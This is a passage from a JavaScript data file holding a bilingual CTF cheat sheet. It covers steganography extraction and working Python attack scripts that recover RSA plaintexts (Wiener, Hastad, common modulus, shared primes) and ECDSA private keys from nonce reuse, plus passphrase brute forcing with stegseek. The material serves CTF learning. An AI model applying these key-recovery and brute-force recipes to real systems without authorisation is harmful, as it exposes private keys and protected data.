// ─── CTF Bible — Techniques CTF avancées ─────────────────────────────────────
// Stéganographie, Crypto avancée, Reversing, Binary Exploitation, Web CTF
// Sources : hacktricks/stego, hacktricks/crypto, hacktricks/python-sandboxes,
//           github.com/Adamkadaban/CTFs cheat sheet

Object.assign(NODES, {

  // ── STÉGANOGRAPHIE AVANCÉE ────────────────────────────────────────────────────
  "stego_advanced": {
    id: "stego_advanced", title: "Stéganographie Avancée", title_en: "Advanced Steganography", category: "ctf", icon: "🖼️",
    description: "Approche systématique : identifier le vrai container, énumérer métadonnées/appended bytes/fichiers embarqués, puis appliquer les techniques spécifiques au format (LSB PNG/BMP, DCT JPEG, spectrogramme audio, chunks PNG cachés, documents OOXML/PDF).",
    description_en: "Systematic approach: identify the true container, enumerate metadata/appended bytes/embedded files, then apply format-specific techniques (LSB PNG/BMP, DCT JPEG, audio spectrogram, hidden PNG chunks, OOXML/PDF documents).",
    commands: [
      { label: "Triage initial (toujours en premier)", label_en: "Initial triage (always first)", cmd: "# 1. Identifier le vrai format\nfile target\nls -lah target\n\n# 2. Métadonnées et chaînes visibles\nexiftool target\nstrings -n 6 target | head\nstrings -n 6 target | tail\n# Essayer plusieurs encodages\nstrings -e l -n 6 target | head\nstrings -e b -n 6 target | head\n\n# 3. Données appendées / fichiers embarqués\nbinwalk target\nbinwalk -e target\nbinwalk --dd='.*' target\nforemost -i target\n\n# 4. Comparer deux fichiers byte par byte\ncmp original.jpg stego.jpg -b -l" },
      { label: "PNG — bit-planes / LSB (zsteg + StegoVeritas)", label_en: "PNG — bit-planes / LSB (zsteg + StegoVeritas)", cmd: "# zsteg énumère toutes les combinaisons LSB/bit-plane PNG/BMP :\nzsteg -a file.png\nzsteg -E '1b,rgb,lsb,xy' file.png > output\n\n# StegoVeritas : batterie de transforms + LSB brute force\nstegoVeritas file.png\n\n# Validation structure PNG (chunks tEXt, iTXt, iCCP, eXIf, données après IEND)\npngcheck -v file.png\npngcheck -vp file.png\nmagick identify -verbose file.png\n\n# Web : Aperi'Solve + StegOnline\n# https://aperisolve.com/\n# https://stegonline.georgeom.net/" },
      { label: "JPEG — OutGuess, steghide, stegseek, ELA", label_en: "JPEG — OutGuess, steghide, stegseek, ELA", cmd: "# Métadonnées JPEG (segments COM, APP1 EXIF, APPn)\nexiftool -a -u -g1 file.jpg\nstrings -n 6 file.jpg | head\nbinwalk file.jpg\n\n# Outils stégo JPEG (domaine DCT)\noutguess -r file.jpg output.txt\nsteghide info file.jpg\nsteghide extract -sf file.jpg\nsteghide extract -sf file.jpg --passphrase 'password'\n\n# Brute force passphrase (beaucoup plus rapide que steghide)\nstegseek file.jpg /usr/share/wordlists/rockyou.txt\n# ou StegCracker :\nstegcracker file.jpg wordlist.txt\n\n# Error Level Analysis (zones retouchées)\n# https://29a.ch/sandbox/2012/imageerrorlevelanalysis/" },
      { label: "GIF/APNG — extraction de frames", label_en: "GIF/APNG — frame extraction", cmd: "# Extraire les frames avec ffmpeg\nffmpeg -i anim.gif frame_%04d.png\n\n# Alternative rapide\ngifsicle --explode anim.gif\n\n# Frame differencing (contenu visible uniquement dans le delta)\nmagick frame_0001.png frame_0002.png -compose difference -composite diff.png\n\n# APNG : détecter l'animation\nexiftool -a -G1 file.png | grep -i animation\nffmpeg -i file.png -vsync 0 frames/frame_%03d.png\n\n# Payload encodé comme compte de pixels par frame :\npython3 << 'EOF'\nfrom PIL import Image\nimport glob\nout = []\nfor f in sorted(glob.glob('frames/frame_*.png')):\n    counts = Image.open(f).getcolors()\n    target = dict(counts).get((255, 0, 255, 255))  # ajuster la couleur cible\n    out.append(target or 0)\nprint(bytes(out).decode('latin1'))\nEOF" },
      { label: "Stegsolve — filtres visuels canal par canal (Java)", label_en: "Stegsolve — per-channel visual filters (Java)", cmd: "java -jar stegsolve.jar\n# Ouvrir l'image -> parcourir les plans bit par bit\n# Data Extract -> LSB First, RGB\n# Canaux : R/G/B/A isolés, XOR entre plans\n# FFT-based tricks :\n# http://bigwww.epfl.ch/demo/ip/demos/FFT/\n# https://github.com/0xcomposure/FFTStegPic" },
      { label: "Données appendées et fichiers polyglots", label_en: "Appended data and polyglot files", cmd: "# Vérifier la fin du fichier\ntail -c 200 file | xxd\n\n# Carver manuel à un offset connu\ndd if=file of=carved.bin bs=1 skip=<offset>\nfile carved.bin\n\n# Magic bytes (quand file est confus)\nxxd -g 1 -l 32 file\n# JPEG: FF D8 FF | PNG: 89 50 4E 47 | ZIP: 50 4B 03 04\n# GIF: 47 49 46 38 | PDF: 25 50 44 46 | ELF: 7F 45 4C 46\n\n# Tenter unzip/7z même sans extension zip\n7z l file\nunzip -l file\n\n# QR code depuis blob binaire (taille = carré parfait ?)\npython3 -c \"import math; print(math.isqrt(2500))\"  # 50 -> image 50x50\n# Décodeur : https://www.dcode.fr/binary-image\nzbarimg file.png" },
      { label: "Analyse hexadécimale et magic bytes", label_en: "Hex analysis and magic bytes", cmd: "xxd challenge.jpg | head -20\nhexdump -C challenge.jpg | head -20\n# Éditeur hex graphique :\nghex challenge.jpg\n# Corriger les magic bytes corrompus :\n# hexedit challenge.jpg" },
      { label: "Binwalk — extraction approfondie", label_en: "Binwalk — deep extraction", cmd: "binwalk file\nbinwalk -e file                # extraction automatique\nbinwalk --dd='.*' file         # forcer extraction tout format\nforemost -i file -o output/    # carving alternatif\n\n# Si extraction échoue mais signatures détectées :\n# carver manuellement avec dd sur l'offset rapporté" }
    ],
    lookfor: [
      "file et l'extension en désaccord : faire confiance à file (magic bytes)",
      "Données après IEND (PNG) ou fin du JPEG : binwalk + tail|xxd",
      "Métadonnées EXIF : commentaires, GPS, logiciel, date suspecte",
      "LSB dans canaux RGB (PNG/BMP) : zsteg -a en priorité",
      "Chunks tEXt / iTXt / iCCP / eXIf dans les PNG : pngcheck -v",
      "Fichiers ZIP, PDF ou ELF cachés dans l'image : binwalk",
      "GIF multi-frames : une frame contient le flag ou diff entre frames",
      "Passphrase steghide : tester le titre du challenge, stegseek rockyou"
    ],
    lookfor_en: [
      "file and extension mismatch: trust file (magic bytes)",
      "Data after IEND (PNG) or JPEG EOF: binwalk + tail|xxd",
      "EXIF metadata: comments, GPS, software, suspicious date",
      "LSB in RGB channels (PNG/BMP): zsteg -a first",
      "tEXt / iTXt / iCCP / eXIf chunks in PNG: pngcheck -v",
      "ZIP, PDF or ELF files hidden inside the image: binwalk",
      "Multi-frame GIF: one frame contains the flag or diff between frames",
      "steghide passphrase: try challenge title, stegseek with rockyou"
    ],
    tips: [
      "Toujours commencer par : file, exiftool, strings, binwalk dans cet ordre (hacktricks workflow)",
      "stegseek est bien plus rapide que steghide pour le brute force de passphrase (github.com/RickdeJager/stegseek)",
      "PNG supporte les chunks tEXt cachés et données après IEND : pngcheck -v révèle les deux",
      "Aperisolve.com fait tourner automatiquement zsteg, steghide, binwalk, etc. sur une image uploadée",
      "JPEG : traiter d'abord comme container de métadonnées (haut signal, rapide), puis domaine DCT",
      "Steg outillage reference : https://0xrick.github.io/lists/stego/ et https://github.com/DominicBreuker/stego-toolkit"
    ],
    tips_en: [
      "Always start with: file, exiftool, strings, binwalk in that order (hacktricks workflow)",
      "stegseek is much faster than steghide for passphrase brute force (github.com/RickdeJager/stegseek)",
      "PNG supports hidden tEXt chunks and data after IEND: pngcheck -v reveals both",
      "Aperisolve.com automatically runs zsteg, steghide, binwalk, etc. on an uploaded image",
      "JPEG: treat first as metadata container (high signal, fast), then DCT domain",
      "Steg tooling reference: https://0xrick.github.io/lists/stego/ and https://github.com/DominicBreuker/stego-toolkit"
    ],
    choices: [
      { label: "Flag trouvé dans les données cachées !", label_en: "Flag found in hidden data!", next: "flag_found", icon: "🏁" },
      { label: "Fichier imbriqué extrait → analyser ce fichier", label_en: "Embedded file extracted → analyze it", next: "forensics", icon: "🔍" },
      { label: "Données chiffrées trouvées → déchiffrer", label_en: "Encrypted data found → decrypt it", next: "crypto", icon: "🔐" },
      { label: "Stégo audio spécifiquement", label_en: "Audio steganography specifically", next: "stego_audio", icon: "🎵" },
      { label: "Stégo texte (Unicode/whitespace)", label_en: "Text steganography (Unicode/whitespace)", next: "stego_text", icon: "📄" }
    ]
  },

  // ── STÉGANOGRAPHIE AUDIO ──────────────────────────────────────────────────────
  "stego_audio": {
    id: "stego_audio", title: "Stéganographie Audio", title_en: "Audio Steganography", category: "ctf", icon: "🎵",
    description: "Patterns courants en audio stego CTF : messages dans le spectrogramme, LSB embedding dans les samples WAV, DTMF dial tones, FSK/modem, SSTV, et Morse. Inspecter le spectrogramme EN PREMIER avant tout outil LSB.",
    description_en: "Common CTF audio stego patterns: messages hidden in the spectrogram, LSB embedding in WAV samples, DTMF dial tones, FSK/modem, SSTV, and Morse. Inspect the spectrogram FIRST before any LSB tool.",
    commands: [
      { label: "Triage audio initial", label_en: "Initial audio triage", cmd: "file audio\nffmpeg -v info -i audio -f null -\nexiftool audio" },
      { label: "Spectrogramme — Sonic Visualiser (outil principal)", label_en: "Spectrogram — Sonic Visualiser (primary tool)", cmd: "# Sonic Visualiser : https://www.sonicvisualiser.org/\n# Layer -> Add Spectrogram\n# Chercher du texte, de l'ASCII art, des patterns\n\n# Alternative CLI avec sox :\nsox input.wav -n spectrogram -o spectrogram.png\n\n# Audacity : View > Show Clipping, mode Spectrogram\n# Academo online : https://academo.org/demos/spectrum-analyzer/" },
      { label: "WAV LSB — WavSteg", label_en: "WAV LSB — WavSteg", cmd: "# WavSteg (https://github.com/ragibson/Steganography#WavSteg)\npython3 WavSteg.py -r -b 1 -s sound.wav -o out.bin\npython3 WavSteg.py -r -b 2 -s sound.wav -o out.bin\n\n# DeepSound (Windows) : http://jpinsoft.net/deepsound/\n# Supporte WAV avec mot de passe" },
      { label: "FSK / Modem — minimodem", label_en: "FSK / Modem — minimodem", cmd: "# Audio FSK (tones alternants dans le spectrogramme)\n# Générer un spectrogramme pour estimer les fréquences\nsox noise.wav -n spectrogram -o spec.png\n\n# Tester les bauds courants\nminimodem -f noise.wav 45\nminimodem -f noise.wav 300\nminimodem -f noise.wav 1200\nminimodem -f noise.wav 2400\n# Options utiles : --rx-invert si le signal est inversé" },
      { label: "DTMF — touches téléphoniques", label_en: "DTMF — telephone keypad tones", cmd: "# DTMF encode des chars comme paires de fréquences fixes\n# Détection CLI :\nmultimon-ng -a DTMF -t wav file.wav\n\n# Online decoders :\n# https://unframework.github.io/dtmf-detect/\n# http://dialabc.com/sound/detect/index.html\n\n# Attention : résultat en chiffres -> peut être multitap ABC\n# Décodeur multitap : https://www.dcode.fr/multitap-abc-cipher" },
      { label: "SSTV, Morse, Fax", label_en: "SSTV, Morse, Fax", cmd: "# SSTV (Slow Scan TV) - decode avec qsstv ou RX-SSTV :\n# https://ourcodeworld.com/articles/read/956/\n\n# Morse audio :\n# https://morsecode.world/international/decoder/audio-decoder-adaptive.html\n\n# Fax machine audio :\n# http://www.dxsoft.com/en/products/seatty/\n\n# Cassette tape (C64) :\n# https://github.com/lunderhage/c64tapedecode" },
      { label: "Manipulation vitesse/pitch/sens", label_en: "Speed / pitch / direction manipulation", cmd: "# Changer la vitesse ou le pitch peut révéler du contenu\n# Online : https://29a.ch/timestretch/\n# Reverse : https://audiotrimmer.com/online-mp3-reverser/\n\n# Audacity : Effects > Change Tempo, Reverse" }
    ],
    lookfor: [
      "Audio ressemblant à du bruit ou des tones réguliers : spectrogramme en PREMIER",
      "Tones alternants à 2 fréquences : FSK/modem ou DTMF",
      "Beeps réguliers courts/longs : Morse",
      "Sons de fax ou grincement : SSTV ou FAX decoding",
      "WAV non compressé avec anomalies dans les samples bas : LSB embedding"
    ],
    lookfor_en: [
      "Audio sounding like noise or regular tones: spectrogram FIRST",
      "Two alternating frequencies: FSK/modem or DTMF",
      "Regular short/long beeps: Morse code",
      "Fax noise or screeching sounds: SSTV or FAX decoding",
      "Uncompressed WAV with anomalies in low-order samples: LSB embedding"
    ],
    tips: [
      "Sonic Visualiser est l'outil primaire pour les spectrogrammes CTF",
      "sox génère un spectrogramme PNG en ligne de commande : utile en remote",
      "DTMF output en chiffres -> penser au multitap ABC cipher sur dcode.fr",
      "minimodem auto-détecte les fréquences mark/space, tester plusieurs bauds si garbled"
    ],
    tips_en: [
      "Sonic Visualiser is the primary tool for CTF spectrograms",
      "sox generates a PNG spectrogram from the command line: useful in remote environments",
      "DTMF output in digits → think multitap ABC cipher on dcode.fr",
      "minimodem auto-detects mark/space frequencies; try multiple baud rates if garbled"
    ],
    choices: [
      { label: "Flag trouvé dans l'audio !", label_en: "Flag found in the audio!", next: "flag_found", icon: "🏁" },
      { label: "Retour stégo générale", label_en: "Back to general steganography", next: "stego_advanced", icon: "🖼️" }
    ]
  },

  // ── STÉGANOGRAPHIE TEXTE ──────────────────────────────────────────────────────
  "stego_text": {
    id: "stego_text", title: "Stéganographie Texte & Documents", title_en: "Text & Document Steganography", category: "ctf", icon: "📄",
    description: "Texte qui se comporte anormalement : caractères Unicode homoglyphes, zero-width joiners/spaces, whitespace encoding, bidirectional overrides. Documents PDF et OOXML (docx) comme containers de fichiers embarqués.",
    description_en: "Text behaving abnormally: Unicode homoglyph characters, zero-width joiners/spaces, whitespace encoding, bidirectional overrides. PDF and OOXML (docx) documents as embedded file containers.",
    commands: [
      { label: "Inspecter les codepoints Unicode suspects", label_en: "Inspect suspicious Unicode codepoints", cmd: "# Détecter caractères non-ASCII ou whitespace inhabituel\npython3 - <<'PY'\nimport sys\ns = open('challenge.txt', encoding='utf-8').read()\nfor i, ch in enumerate(s):\n    if ord(ch) > 127 or (ch.isspace() and ch not in ' \\n\\t'):\n        print(i, hex(ord(ch)), repr(ch))\nPY\n\n# Ne pas modifier le fichier avant d'avoir tout extrait !" },
      { label: "Homoglyphes et zero-width characters", label_en: "Homoglyphs and zero-width characters", cmd: "# Homoglyphes : même aspect, codepoints différents\n# (Latin 'a' vs Cyrillique 'а')\n# Playground : https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder\n\n# Zero-width chars courants :\n# U+200B ZERO WIDTH SPACE\n# U+200C ZERO WIDTH NON-JOINER\n# U+200D ZERO WIDTH JOINER\n# U+FEFF BOM / ZERO WIDTH NO-BREAK SPACE\n\n# Bidirectional override chars : U+202E RIGHT-TO-LEFT OVERRIDE\npython3 -c \"\nwith open('challenge.txt','rb') as f: data=f.read()\nprint([hex(b) for b in data if b > 127])\n\"" },
      { label: "Whitespace encoding (SNOW)", label_en: "Whitespace encoding (SNOW)", cmd: "# SNOW encode dans les espaces et tabulations de fin de ligne\nstegsnow -C -m 'password' challenge.txt\nstegsnow -C challenge.txt\n\n# Whitespace language (Brainfuck-like avec espaces/tabs)\n# Interpreter : https://vii5ard.github.io/whitespace/" },
      { label: "CSS unicode-range channels", label_en: "CSS unicode-range channels", cmd: "# @font-face unicode-range peut encoder des bytes\ngrep -o 'U+[0-9A-Fa-f]\\+' styles.css | tr -d 'U+\\n' | xxd -r -p\n# Si plusieurs bytes par declaration, splitter sur virgules d'abord :\ngrep -o 'U+[0-9A-Fa-f]\\+' styles.css | tr ',+' '\\n' | while read c; do printf \"\\\\x$c\"; done" },
      { label: "PDF — objets cachés et fichiers embarqués", label_en: "PDF — hidden objects and embedded files", cmd: "pdfinfo file.pdf\npdfdetach -list file.pdf\npdfdetach -saveall file.pdf\n\n# Désactiver la compression pour chercher dans les objets\nqpdf --qdf --object-streams=disable file.pdf out.pdf\nstrings out.pdf | grep -i flag\n\n# Outils spécialisés :\npdf-parser.py challenge.pdf\npdfid.py challenge.pdf" },
      { label: "Office OOXML (docx/xlsx/pptx) — extraction ZIP", label_en: "Office OOXML (docx/xlsx/pptx) — ZIP extraction", cmd: "# OOXML = ZIP + XML + assets\n7z l file.docx\n7z x file.docx -oout/\nunzip file.docx -d out/\n\n# Chercher dans :\n# word/document.xml (contenu)\n# word/_rels/ (relations externes)\n# word/media/ (images embarquées)\n# customXml/ (XML custom)\n\nfind out/ -type f | xargs strings | grep -i flag" }
    ],
    lookfor: [
      "Texte qui s'affiche normalement mais a plus de bytes que prévu : zero-width chars",
      "Caractères identiques visuellement mais comportement différent : homoglyphes Unicode",
      "Lignes avec espaces/tabulations en fin de ligne : SNOW ou whitespace encoding",
      "PDF avec objets nombreux ou streams compressés inhabituels",
      "Fichier .docx qui contient des médias ou des parties custom XML inattendues"
    ],
    lookfor_en: [
      "Text displaying normally but more bytes than expected: zero-width chars",
      "Visually identical characters with different behavior: Unicode homoglyphs",
      "Lines with trailing spaces/tabs: SNOW or whitespace encoding",
      "PDF with many objects or unusual compressed streams",
      ".docx file containing unexpected media or custom XML parts"
    ],
    tips: [
      "Ne jamais modifier le fichier texte avant analyse : certains éditeurs détruisent les zero-width chars",
      "Les bidirectional override chars (U+202E) peuvent faire afficher le texte dans le mauvais ordre",
      "OOXML : toujours tenter unzip même si l'extension n'est pas .zip",
      "PDF : qpdf --qdf décompresse les streams, rend le fichier searchable avec strings/grep"
    ],
    tips_en: [
      "Never modify the text file before analysis: some editors destroy zero-width chars",
      "Bidirectional override chars (U+202E) can cause text to render in the wrong order",
      "OOXML: always try unzip even if the extension is not .zip",
      "PDF: qpdf --qdf decompresses streams, making the file searchable with strings/grep"
    ],
    choices: [
      { label: "Flag trouvé !", label_en: "Flag found!", next: "flag_found", icon: "🏁" },
      { label: "Retour stégo générale", label_en: "Back to general steganography", next: "stego_advanced", icon: "🖼️" }
    ]
  },

  // ── CRYPTOGRAPHIE AVANCÉE ─────────────────────────────────────────────────────
  "crypto_rsa": {
    id: "crypto_rsa", title: "RSA — Attaques Classiques CTF", title_en: "RSA — Classic CTF Attacks", category: "ctf", icon: "🔑",
    description: "Attaques RSA courantes en CTF : petit exposant, factorisation, Wiener, Hastad broadcast, common modulus, shared primes, Franklin-Reiter (messages liés), Coppersmith/LLL pour bits partiels. RsaCtfTool automatise la plupart.",
    description_en: "Common CTF RSA attacks: small exponent, factorization, Wiener, Hastad broadcast, common modulus, shared primes, Franklin-Reiter (related messages), Coppersmith/LLL for partial bits. RsaCtfTool automates most of them.",
    commands: [
      { label: "Triage initial RSA (collecter n, e, c)", label_en: "Initial RSA triage (collect n, e, c)", cmd: "# Paramètres à collecter :\n# n = p * q (modulus)\n# e = exposant public (souvent 3, 65537)\n# c = ciphertext\n# Chercher aussi : dp, dq, bits de p/q connus, plaintext partiel\n\n# Lire une clé publique PEM :\npython3 << 'EOF'\nfrom Crypto.PublicKey import RSA\nwith open('pub.pem','r') as f:\n    key = RSA.import_key(f.read())\nprint('n =', key.n)\nprint('e =', key.e)\nprint('bits =', key.n.bit_length())\nEOF\n\n# Taille de n :\npython3 -c \"from Crypto.Util.number import *; n=MODULUS; print(size(n), 'bits')\"" },
      { label: "Factoriser n — factordb + factordb Python", label_en: "Factor n — factordb + factordb Python", cmd: "# 1. Site web : factordb.com (base de données de N déjà factorisés)\n# 2. alpertron.com.ar/ECM.HTM (Euler totient aussi)\n\n# Via Python avec factordb :\npython3 << 'EOF'\nfrom Crypto.Util.number import inverse, long_to_bytes\nfrom factordb.factordb import FactorDB\n\nn = MODULUS\ne = EXPOSANT\nc = CIPHERTEXT\n\nf = FactorDB(n)\nf.connect()\nfactors = f.get_factor_list()\nprint('Factors:', factors)\n\nphi = 1\nfor factor in factors:\n    phi *= (factor - 1)\n\nd = inverse(e, phi)\nm = pow(c, d, n)\nprint(long_to_bytes(m))\nEOF" },
      { label: "e petit (e=3) — Coppersmith / racine entière", label_en: "Small e (e=3) — Coppersmith / integer root", cmd: "# Si e=3 et message petit (pas de padding) : c = m^3 → racine cubique entière\npython3 << 'EOF'\nfrom gmpy2 import iroot\nfrom Crypto.Util.number import long_to_bytes\nc = CIPHERTEXT\ne = 3\nm, exact = iroot(c, e)\nif exact:\n    print(long_to_bytes(int(m)))\nelse:\n    print('Pas exact — padding present ou message trop grand')\nEOF\n\n# Aussi testé par RsaCtfTool automatiquement" },
      { label: "Hastad Broadcast Attack (même msg, e moduli différents)", label_en: "Hastad Broadcast Attack (same msg, different moduli)", cmd: "# Même message chiffré avec e=3 et e moduli pairwise coprime\n# CRT puis racine cubique entière\npython3 << 'EOF'\nfrom gmpy2 import iroot\nfrom sympy.ntheory.modular import crt\nn1, n2, n3 = N1, N2, N3\nc1, c2, c3 = C1, C2, C3\nresult, _ = crt([n1, n2, n3], [c1, c2, c3])\nm, exact = iroot(result, 3)\nif exact:\n    from Crypto.Util.number import long_to_bytes\n    print(long_to_bytes(int(m)))\nEOF" },
      { label: "Wiener's Attack (d petit, e grand)", label_en: "Wiener's Attack (small d, large e)", cmd: "# Si d < n^0.25 : continued fractions recover d from e/n\npip install owiener\npython3 << 'EOF'\nimport owiener\nfrom Crypto.Util.number import long_to_bytes\ne = EXPOSANT\nn = MODULUS\nc = CIPHERTEXT\nd = owiener.attack(e, n)\nif d:\n    print('d =', d)\n    m = pow(c, d, n)\n    print(long_to_bytes(m))\nelse:\n    print('Wiener failed')\nEOF" },
      { label: "Common Modulus Attack (même n, e1 et e2 coprimes)", label_en: "Common Modulus Attack (same n, coprime e1 and e2)", cmd: "# c1 = m^e1 mod n, c2 = m^e2 mod n, gcd(e1,e2)=1\n# Bezout : e1*s1 + e2*s2 = 1 -> m = c1^s1 * c2^s2 mod n\npython3 << 'EOF'\nfrom gmpy2 import gcdext\nfrom Crypto.Util.number import long_to_bytes\nn = MODULUS\ne1, e2 = E1, E2\nc1, c2 = C1, C2\ng, s1, s2 = gcdext(e1, e2)\n# Si s1 ou s2 negatif : utiliser l'inverse modulaire\nif s1 < 0:\n    m = (pow(pow(c1, -1, n), -s1, n) * pow(c2, s2, n)) % n\nelse:\n    m = (pow(c1, s1, n) * pow(pow(c2, -1, n), -s2, n)) % n\nprint(long_to_bytes(int(m)))\nEOF" },
      { label: "Shared primes entre moduli (gcd != 1)", label_en: "Shared primes across moduli (gcd != 1)", cmd: "# Si plusieurs N partagent un facteur premier (mauvaise randomness)\npython3 << 'EOF'\nfrom math import gcd\nfrom Crypto.Util.number import inverse, long_to_bytes\nmoduli = [N1, N2, N3]  # liste de tous les moduli du challenge\nfor i in range(len(moduli)):\n    for j in range(i+1, len(moduli)):\n        g = gcd(moduli[i], moduli[j])\n        if g > 1:\n            print(f'gcd(n{i}, n{j}) = {g}')  # facteur trouvé !\nEOF" },
      { label: "Franklin-Reiter (messages liés, même n et e)", label_en: "Franklin-Reiter (related messages, same n and e)", cmd: "# Si m2 = a*m1 + b (relation affine connue), même n et e\n# Résoudre via GCD de polynômes dans SageMath :\n# sage: R.<x> = Zmod(n)[]\n# sage: f1 = x^e - c1\n# sage: f2 = (a*x + b)^e - c2\n# sage: m = -gcd(f1, f2).coefficients()[0]\n# Ref: https://github.com/defund/coppersmith" },
      { label: "Coppersmith / LLL (bits partiels connus)", label_en: "Coppersmith / LLL (known partial bits)", cmd: "# Quand on connait les bits hauts de p, ou message structuré (flag{...unknown})\n# Nécessite SageMath :\n# sage: n = MODULUS; e = EXP\n# Coppersmith small roots sur polynôme univarié mod n\n# Templates : https://github.com/defund/coppersmith\n\n# RsaCtfTool automatise Coppersmith :\npython3 RsaCtfTool.py -n N -e E --attack all --decrypt C" },
      { label: "RsaCtfTool — automatiser toutes les attaques", label_en: "RsaCtfTool — automate all attacks", cmd: "git clone https://github.com/Ganapati/RsaCtfTool\ncd RsaCtfTool && pip install -r requirements.txt\n\n# Avec n et e :\npython3 RsaCtfTool.py -n MODULUS -e EXPOSANT --decrypt CIPHERTEXT\n# Avec clé publique PEM :\npython3 RsaCtfTool.py --publickey pub.key --decrypt cipher.txt\n# Tester toutes les attaques :\npython3 RsaCtfTool.py -n N -e E --attack all\n# Lister les attaques disponibles :\npython3 RsaCtfTool.py --listattacks" }
    ],
    lookfor: [
      "n factorisable sur factordb.com → attaque immédiate (CRT)",
      "e=3 ou e petit et message non paddé → Hastad ou racine entière",
      "e très grand par rapport à n → d probablement petit → Wiener",
      "Même n utilisé pour deux chiffrements avec e différents → Common Modulus",
      "Plusieurs N dans le challenge → tester gcd(ni, nj) → shared primes",
      "Flag embarqué dans le plaintext (flag{X...}) → Coppersmith petit inconnu",
      "Deux messages liés (m2=a*m1+b) → Franklin-Reiter puis Coppersmith"
    ],
    lookfor_en: [
      "n factorable on factordb.com → immediate attack (CRT)",
      "e=3 or small e with unpadded message → Hastad or integer root",
      "Very large e relative to n → d probably small → Wiener",
      "Same n used for two ciphertexts with different e → Common Modulus",
      "Multiple N values in the challenge → test gcd(ni, nj) → shared primes",
      "Flag embedded in plaintext (flag{X...}) → Coppersmith small unknown",
      "Two related messages (m2=a*m1+b) → Franklin-Reiter then Coppersmith"
    ],
    tips: [
      "RsaCtfTool (github.com/Ganapati/RsaCtfTool) automatise >30 attaques CTF RSA — toujours l'essayer en premier",
      "factordb.com + alpertron.com.ar/ECM.HTM : bases de N déjà factorisés très efficaces en CTF",
      "SageMath est indispensable pour LLL/Coppersmith/CRT avancé",
      "Textbook RSA sans OAEP/PSS → les attaques algébriques et oracle deviennent beaucoup plus probables",
      "Récupérer les params d'un PEM : from Crypto.PublicKey import RSA; key.n, key.e, key.p, key.q, key.d"
    ],
    tips_en: [
      "RsaCtfTool (github.com/Ganapati/RsaCtfTool) automates >30 CTF RSA attacks — always try it first",
      "factordb.com + alpertron.com.ar/ECM.HTM: databases of pre-factored N, very effective in CTF",
      "SageMath is essential for advanced LLL/Coppersmith/CRT",
      "Textbook RSA without OAEP/PSS → algebraic and oracle attacks become much more likely",
      "Extract PEM params: from Crypto.PublicKey import RSA; key.n, key.e, key.p, key.q, key.d"
    ],
    choices: [
      { label: "Message déchiffré → flag trouvé !", label_en: "Message decrypted → flag found!", next: "flag_found", icon: "🏁" },
      { label: "ECC / ECDSA impliqué → nonce reuse", label_en: "ECC / ECDSA involved → nonce reuse", next: "crypto_ecc", icon: "📐" },
      { label: "Retour aux techniques crypto générales", label_en: "Back to general crypto techniques", next: "crypto", icon: "🔐" }
    ]
  },

  // ── ECC / ECDSA ───────────────────────────────────────────────────────────────
  "crypto_ecc": {
    id: "crypto_ecc", title: "ECC / ECDSA — Nonce Reuse & Invalid Curve", title_en: "ECC / ECDSA — Nonce Reuse & Invalid Curve", category: "ctf", icon: "📐",
    description: "Cryptographie sur courbes elliptiques en CTF : réutilisation ou biais de nonce ECDSA permettant de récupérer la clé privée, invalid-curve attacks. SageMath est indispensable.",
    description_en: "Elliptic curve cryptography in CTF: ECDSA nonce reuse or bias allowing private key recovery, invalid-curve attacks. SageMath is essential.",
    commands: [
      { label: "Détecter la réutilisation de nonce ECDSA", label_en: "Detect ECDSA nonce reuse", cmd: "# Si deux signatures (r1,s1) et (r2,s2) ont r1 == r2 => même nonce k\n# Récupérer k puis d (clé privée) :\npython3 << 'EOF'\nfrom Crypto.Hash import SHA256\nfrom sympy import mod_inverse\n\n# Ordre de la courbe\nn = CURVE_ORDER\n# Hashes des messages\nh1 = int(SHA256.new(msg1).hexdigest(), 16)\nh2 = int(SHA256.new(msg2).hexdigest(), 16)\nr, s1, s2 = R, S1, S2\n\n# k = (h1 - h2) * inverse(s1 - s2, n) mod n\nk = ((h1 - h2) * mod_inverse(s1 - s2, n)) % n\n# d = (s1*k - h1) * inverse(r, n) mod n\nd = ((s1 * k - h1) * mod_inverse(r, n)) % n\nprint('Clé privée d =', d)\nEOF" },
      { label: "ECDSA nonce biaisé — attaque lattice (LLL)", label_en: "Biased ECDSA nonce — lattice attack (LLL)", cmd: "# Si les nonces ont des bits hauts/bas toujours nuls (biais)\n# -> Hidden Number Problem, solvable par LLL\n# Nécessite SageMath + plusieurs signatures\n# Reference : https://github.com/defund/coppersmith\n# Template lattice ECDSA : https://github.com/joseph-makar/ECDSA-Nonce-Bias-Attack" },
      { label: "Invalid-curve attack", label_en: "Invalid-curve attack", cmd: "# Si le serveur ne valide pas que les points sont sur la courbe :\n# 1. Forcer des points sur des courbes faibles (petit ordre)\n# 2. Récupérer d mod petit_ordre\n# 3. CRT pour reconstruire d\n# Nécessite SageMath pour définir des courbes alternatives\n# sage: E = EllipticCurve(GF(p), [a, b_fake])\n# sage: E.order() # chercher petit ordre" },
      { label: "Parser et vérifier une signature ECDSA", label_en: "Parse and verify an ECDSA signature", cmd: "pip install ecdsa\npython3 << 'EOF'\nfrom ecdsa import VerifyingKey, SECP256k1, BadSignatureError\nimport hashlib\n\nvk = VerifyingKey.from_string(bytes.fromhex(PUBLIC_KEY_HEX), curve=SECP256k1)\nmsg = b'message'\ntry:\n    vk.verify(bytes.fromhex(SIG_HEX), msg, hashlib.sha256)\n    print('Valid')\nexcept BadSignatureError:\n    print('Invalid')\nEOF" }
    ],
    lookfor: [
      "Deux signatures avec la même valeur r → nonce k réutilisé → clé privée récupérable",
      "Nonces avec des bits hauts toujours à 0 → biais → attaque HNP/lattice",
      "Serveur qui accepte des points sans validation → invalid-curve attack",
      "Algorithme de signature faible (MD5 ou SHA1 au lieu de SHA256)"
    ],
    lookfor_en: [
      "Two signatures with the same r value → nonce k reused → private key recoverable",
      "Nonces with high bits always 0 → bias → HNP/lattice attack",
      "Server accepting points without validation → invalid-curve attack",
      "Weak signature hash algorithm (MD5 or SHA1 instead of SHA256)"
    ],
    tips: [
      "SageMath est indispensable pour les attaques ECC : arithmétique modulaire, courbes, LLL",
      "Bibliothèque Python `ecdsa` pour parser/vérifier sans SageMath",
      "Nonce reuse : tester d'abord si r est identique dans plusieurs signatures du challenge"
    ],
    tips_en: [
      "SageMath is essential for ECC attacks: modular arithmetic, curves, LLL",
      "Python `ecdsa` library for parsing/verifying without SageMath",
      "Nonce reuse: first check if r is identical across multiple challenge signatures"
    ],
    choices: [
      { label: "Clé privée récupérée → flag !", label_en: "Private key recovered → flag!", next: "flag_found", icon: "🏁" },
